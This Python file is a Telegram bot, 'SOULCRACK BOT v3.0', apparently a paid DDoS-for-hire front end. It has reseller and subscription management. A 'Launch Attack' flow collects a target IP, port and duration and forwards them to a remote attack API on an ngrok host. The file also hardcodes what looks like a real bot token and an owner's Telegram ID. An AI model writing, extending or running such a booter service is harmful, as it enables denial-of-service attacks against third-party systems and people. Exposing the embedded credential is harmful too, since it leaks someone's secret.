import os, json, requests, logging, threading, time
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread

# Flask for Render to keep it alive
app = Flask('')
@app.route('/')
def home(): return "Bot is Live!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIGURATION ---
BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
OWNER_ID = 7529105228
ADMIN_IDS = [7529105228]
DB_FILE = 'users_db.json'

# --- DATABASE LOGIC ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f: return json.load(f)
    return {"users": {}, "resellers": [], "logs": []}

def save_db(data):
    with open(DB_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_db()
temp_data = {}

# --- KEYBOARDS ---
def get_main_keyboard(uid):
    keyboard = [
        [KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")],
        [KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")]
    ]
    if uid == OWNER_ID or str(uid) in db["resellers"]:
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
    if uid == OWNER_ID:
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_mgmt_keyboard():
    keyboard = [
        [KeyboardButton("➕ Add User"), KeyboardButton("➖ Remove User")],
        [KeyboardButton("📋 Users List"), KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# --- ATTACK TRIGGER ---
def trigger_attack(host, port, duration):
    api_url = f"https://bubble-sponge-unpicked.ngrok-free.dev/attack?host={host}&port={port}&time={duration}"
    try: requests.get(api_url, timeout=5)
    except: pass

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text("🚀 **SOULCRACK BOT v3.0**\nReady for action!", reply_markup=get_main_keyboard(uid))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    if text == "🎯 Launch Attack":
        if str(uid) not in db["users"] and uid != OWNER_ID:
            await update.message.reply_text("❌ Access Denied! Contact @Devendra")
            return
        temp_data[uid] = {"step": "ip"}
        await update.message.reply_text("🎯 Send Target IP:")

    elif text == "📊 Check Status":
        status = "🟢 Bot is Online\n⚡ API: Connected\n🚀 Attack: Ready"
        await update.message.reply_text(status)

    elif text == "🔐 My Access":
        expiry = db["users"].get(str(uid), "Permanent" if uid == OWNER_ID else "No Access")
        await update.message.reply_text(f"🔐 **YOUR ACCESS:**\nStatus: Active\nExpiry: `{expiry}`")

    elif text == "👥 User Management":
        if uid == OWNER_ID or str(uid) in db["resellers"]:
            await update.message.reply_text("👥 **USER MANAGEMENT**", reply_markup=get_user_mgmt_keyboard())

    elif text == "📋 Users List":
        ulist = "\n".join([f"ID: `{k}` (Exp: {v})" for k, v in db["users"].items()])
        await update.message.reply_text(f"📋 **APPROVED USERS:**\n{ulist if ulist else 'Empty'}")

    elif text == "➕ Add User":
        temp_data[uid] = {"step": "add_id"}
        await update.message.reply_text("➕ Send User ID to Add:")

    elif text == "« Back to Main Menu":
        await update.message.reply_text("Main Menu", reply_markup=get_main_keyboard(uid))

    elif uid in temp_data:
        step = temp_data[uid]["step"]
        if step == "ip":
            temp_data[uid].update({"ip": text, "step": "port"})
            await update.message.reply_text("🎯 Send Port:")
        elif step == "port":
            temp_data[uid].update({"port": text, "step": "time"})
            await update.message.reply_text("🎯 Send Time (sec):")
        elif step == "time":
            ip, port = temp_data[uid]["ip"], temp_data[uid]["port"]
            trigger_attack(ip, port, text)
            await update.message.reply_text(f"🚀 **ATTACK SENT!**\nTarget: `{ip}:{port}`\nTime: `{text}s`")
            del temp_data[uid]
        elif step == "add_id":
            db["users"][text] = (datetime.now() + timedelta(days=30)).strftime('%Y-%m-%d')
            save_db(db)
            await update.message.reply_text(f"✅ User `{text}` added for 30 days.")
            del temp_data[uid]

def main():
    keep_alive()
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app_bot.run_polling()

if __name__ == '__main__':
    main()
